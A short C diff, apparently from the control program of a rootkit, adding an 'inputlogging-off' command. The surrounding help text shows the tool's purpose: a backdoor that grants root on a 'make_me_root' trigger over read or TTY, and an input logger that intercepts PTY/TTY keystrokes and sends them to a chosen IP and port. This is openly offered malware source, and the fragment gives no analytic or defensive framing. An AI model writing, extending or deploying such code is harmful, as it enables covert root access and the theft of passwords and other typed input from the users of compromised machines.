@@ -122,6 +122,9 @@ parse_input(int argc, char **argv)
         return (cmd_t){ handle_logging, (void *)socket };
     }
 
+    if (ARGVCMP(1, "inputlogging-off"))
+        return (cmd_t){ handle_logging, (void *)0 };
+
     help();
     exit(1);
 }
@@ -227,4 +230,5 @@ help()
     printf("%-38s %s\n", "backdoor-use-tty <0 | 1>", "listen for `make_me_root` on read (0) or TTY (1)");
     printf("%-38s %s\n", "backdoor-off", "disable any (read or tty) backdoor");
     printf("%-38s %s\n", "inputlogging <ip> <port>", "intercept {P,T}TY input and send it to <ip>:<port>");
+    printf("%-38s %s\n", "inputlogging-off", "disable input logging");
 }
